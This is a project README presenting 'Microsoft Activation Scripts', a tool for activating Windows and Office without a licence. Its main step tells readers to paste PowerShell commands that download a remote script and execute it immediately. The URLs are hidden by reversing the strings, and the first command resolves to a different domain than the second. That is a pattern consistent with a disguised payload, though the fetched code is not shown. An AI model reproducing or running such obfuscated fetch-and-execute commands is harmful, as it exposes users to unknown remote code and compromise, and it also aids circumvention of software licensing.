<p align="center"><img src="https://cdn.yolly.ai/image/generated/cb6b4046214209a4ce4a85ec30c1a381_0-1789526492991-jfuyh6yd.png" width="125px" alt="MAS Logo"></p>

<h1 align="center">Microsoft  Activation  Scripts (MAS)</h1>

<p align="center">Open-source Windows and Office activator featuring HWID, Ohook, TSforge, and Online KMS activation methods, along with advanced troubleshooting.</p>

<hr>
  
## How to Activate Windows / Office / Extended Security Updates (ESU)?

### Method 1 - PowerShell ❤️

1. Click the **Start Menu**, type `PowerShell`, and open it.

2. Copy and paste the code below and press **Enter.**  
   - For **Windows 8.1, 10 and 11**:
     ```
     iex(irm(-join"sbs.mrtig//:sptth"[-1..-99]))
     ```
	 If the above is blocked (by ISP/DNS), try this (needs updated Windows 10 or 11):  
	 ```
	 iex (curl.exe -s --doh-url https://1.1.1.1/dns-query (-join"niw.detavitca.teg//:sptth"[-1..-99]) | Out-String)
	 ```

3. In the menu that appears, type the number corresponding to one of the **Green** options.

---

> [!TIP]
> - Some ISPs/DNS providers block access to our domains. You can bypass this by enabling [DNS-over-HTTPS (DoH)](https://developers.cloudflare.com/1.1.1.1/encryption/dns-over-https/encrypted-dns-browsers/) in your browser. 
> - **Having trouble**? Visit our [troubleshooting page](https://massgrave.dev/troubleshoot) or raise an issue on [GitHub](https://github.com/massgravel/Microsoft-Activation-Scripts/issues).

> [!NOTE]
>
> - The `irm` command in PowerShell downloads a script from a specified URL, and the `iex` command executes it.
> - Always double-check the URL before executing the command and verify the source is trustworthy when manually downloading files.
> - Be cautious of third parties spreading malware disguised as MAS by altering the URL in the PowerShell command.

---

Latest Version: 3.12  
Release date: 04-Jul-2026
